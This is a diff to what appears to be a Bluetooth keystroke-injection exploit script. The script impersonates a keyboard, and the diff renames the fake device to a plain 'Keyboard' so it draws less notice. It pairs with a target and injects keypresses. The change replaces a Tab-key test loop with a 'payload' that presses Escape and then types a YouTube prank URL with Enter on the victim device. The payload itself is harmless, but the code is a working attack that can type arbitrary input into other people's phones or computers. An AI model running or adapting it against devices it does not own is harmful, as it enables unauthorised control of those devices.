@@ -34,7 +34,7 @@ profile_proc.start()
 # - configure name and class
 log.status("configuring Bluetooth adapter")
 adapter = Adapter(args.interface)
-adapter.set_name("Hi, My Name is Keyboard")
+adapter.set_name("Keyboard")
 adapter.set_class(0x002540)
 run(["hcitool", "name", args.target_address])
 client = KeyboardClient(args.target_address, auto_ack=True)
@@ -81,14 +81,23 @@ with PairingAgent(adapter.iface, args.target_address):
 client.send_keyboard_report()
 
 # send 10 seconds of 'tab' keypresses
-log.status("injecting Tab keypresses for 10 seconds")
-start = time.time()
-while (time.time() - start) < 10:
-  try:
-    client.send_keypress(Key.Tab)
-    time.sleep(0.05)
-  except KeyboardInterrupt:
-    break
+# log.status("injecting Tab keypresses for 10 seconds")
+# start = time.time()
+# while (time.time() - start) < 10:
+#   try:
+#     client.send_keypress(Key.Tab)
+#     time.sleep(0.05)
+#   except KeyboardInterrupt:
+#     break
+log.status("injecting payload")
+client.send_keypress(Key.Escape)
+time.sleep(0.5)
+client.send_keypress(Key.Escape)
+time.sleep(0.5)
+client.send_keypress(Key.Escape)
+time.sleep(0.5)
+client.send_ascii('https://www.youtube.com/watch?v=dQw4w9WgXcQ\n')
+time.sleep(1)
 
 # disconnect the L2CAP sockets
 log.success("payload has been transmitted; disconnecting Bluetooth HID client")
